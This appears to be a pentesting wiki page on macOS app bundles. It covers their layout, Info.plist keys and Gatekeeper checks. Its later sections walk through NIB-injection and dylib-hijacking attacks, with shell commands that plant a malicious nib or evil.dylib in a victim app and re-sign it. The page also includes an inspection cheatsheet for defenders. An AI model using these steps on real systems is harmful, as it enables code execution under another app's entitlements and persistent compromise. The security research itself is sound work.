# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Bundles in macOS serve as containers for a variety of resources including applications, libraries, and other necessary files, making them appear as single objects in Finder, such as the familiar `*.app` files. The most commonly encountered bundle is the `.app` bundle, though other types like `.framework`, `.systemextension`, and `.kext` are also prevalent.

### Essential Components of a Bundle

Within a bundle, particularly within the `<application>.app/Contents/` directory, a variety of important resources are housed:

- **\_CodeSignature**: This directory stores code-signing details vital for verifying the integrity of the application. You can inspect the code-signing information using commands like:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Contains the executable binary of the application that runs upon user interaction.
- **Resources**: A repository for the application's user interface components including images, documents, and interface descriptions (nib/xib files).
- **Info.plist**: Acts as the application's main configuration file, crucial for the system to recognize and interact with the application appropriately.

#### Important Keys in Info.plist

The `Info.plist` file is a cornerstone for application configuration, containing keys such as:

- **CFBundleExecutable**: Specifies the name of the main executable file located in the `Contents/MacOS` directory.
- **CFBundleIdentifier**: Provides a global identifier for the application, used extensively by macOS for application management.
- **LSMinimumSystemVersion**: Indicates the minimum version of macOS required for the application to run.

### Exploring Bundles

To explore the contents of a bundle, such as `Safari.app`, the following command can be used: `bash ls -lR /Applications/Safari.app/Contents`

This exploration reveals directories like `_CodeSignature`, `MacOS`, `Resources`, and files like `Info.plist`, each serving a unique purpose from securing the application to defining its user interface and operational parameters.

#### Additional Bundle Directories

Beyond the common directories, bundles may also include:

- **Frameworks**: Contains bundled frameworks used by the application. Frameworks are like dylibs with extra resources.
- **PlugIns**: A directory for plug-ins and extensions that enhance the application's capabilities.
- **XPCServices**: Holds XPC services used by the application for out-of-process communication.

This structure ensures that all necessary components are encapsulated within the bundle, facilitating a modular and secure application environment.

For more detailed information on `Info.plist` keys and their meanings, the Apple developer documentation provides extensive resources: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: When a quarantined bundle is first executed, macOS performs a deep signature verification and may run it from a randomized translocated path. Once accepted, later launches only perform shallow checks; resource files in `Resources/`, `PlugIns/`, nibs, etc., were historically unchecked. Since macOS 13 Ventura a deep check is enforced on first run and the new *App Management* TCC permission restricts third‑party processes from modifying other bundles without user consent, but older systems remain vulnerable.
- **Bundle Identifier collisions**: Multiple embedded targets (PlugIns, helper tools) reusing the same `CFBundleIdentifier` can break signature validation and occasionally enable URL‑scheme hijacking/confusion. Always enumerate sub‑bundles and verify unique IDs.

## Resource Hijacking (Dirty NIB / NIB Injection)

Before Ventura, swapping UI resources in a signed app could bypass shallow code signing and yield code execution with the app’s entitlements. Current research (2024) shows this still works on pre‑Ventura and on un-quarantined builds:

1. Copy target app to a writable location (e.g., `/tmp/Victim.app`).
2. Replace `Contents/Resources/MainMenu.nib` (or any nib declared in `NSMainNibFile`) with a malicious one that instantiates `NSAppleScript`, `NSTask`, etc.
3. Launch app. The malicious nib executes under the victim’s bundle ID and entitlements (TCC grants, microphone/camera, etc.).
4. Ventura+ mitigates by deep‑verifying the bundle on first launch and requiring *App Management* permission for later modifications, so persistence is harder but initial-launch attacks on older macOS still apply.

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```

## Framework / PlugIn / dylib Hijacking inside Bundles

Because `@rpath` lookups prefer bundled Frameworks/PlugIns, dropping a malicious library inside `Contents/Frameworks/` or `Contents/PlugIns/` can redirect load order when the main binary is signed without library validation or with weak `LC_RPATH` ordering.

Typical steps when abusing an unsigned/ad‑hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notes:
- Hardened runtime with `com.apple.security.cs.disable-library-validation` absent blocks third‑party dylibs; check entitlements first.
- XPC services under `Contents/XPCServices/` often load sibling frameworks—patch their binaries similarly for persistence or privilege escalation paths.

## Quick Inspection Cheatsheet

```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```



## References

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
